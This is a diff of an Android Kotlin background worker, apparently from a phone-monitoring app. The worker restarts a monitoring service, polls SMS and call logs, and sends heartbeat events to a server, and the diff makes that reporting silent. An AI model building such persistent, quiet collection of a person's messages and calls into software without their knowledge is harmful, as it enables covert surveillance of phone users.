@@ -19,8 +19,7 @@ class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(c
         }
 
         return@withContext try {
-            Log.d("SYNC_WORKER", "=== LUONG MANH NHAT DANG CHAY (20 PHUT) ===")
-            MainActivity.addLog("🫀 [Ve si] Luong manh nhat (20 phut) dang kiem tra tong the...")
+            Log.d("SYNC_WORKER", "=== LUONG MANH NHAT DANG CHAY (25 PHUT) ===")
             
             val serviceIntent = Intent(applicationContext, BackgroundMonitoringService::class.java)
             if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
@@ -33,17 +32,23 @@ class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(c
             val callCount = CallLogSync.pollMissingCalls(applicationContext, "WM_STRONG")
             
             if (smsCount > 0 || callCount > 0) {
-                MainActivity.addLog("🛰️ [WM_STRONG] Da quet bu: SMS=\$smsCount, CALL=\$callCount")
+                MainActivity.addLog("🛰️ [WM_STRONG] Đã quét bù: SMS=$smsCount, CALL=$callCount")
             }
 
             val ok = ServerReporter.sendEventSync(
                 context = applicationContext,
                 type = "HEARTBEAT_STRONG",
                 incomingNumber = "HE_THONG",
-                content = "Ve si manh nhat da kiem tra va hoi sinh he thong."
+                content = "Ve si manh nhat da kiem tra va hoi sinh he thong.",
+                silent = true
             )
 
-            if (ok) Result.success() else Result.retry()
+            if (ok) {
+                MainActivity.addLog("🫀 [SyncWorker] Đồng bộ định kỳ hoàn tất (25p)")
+                Result.success()
+            } else {
+                Result.retry()
+            }
         } catch (e: Exception) {
             Log.e("SYNC_WORKER", "❌ Loi luong manh nhat: \${e.message}")
             Result.retry()
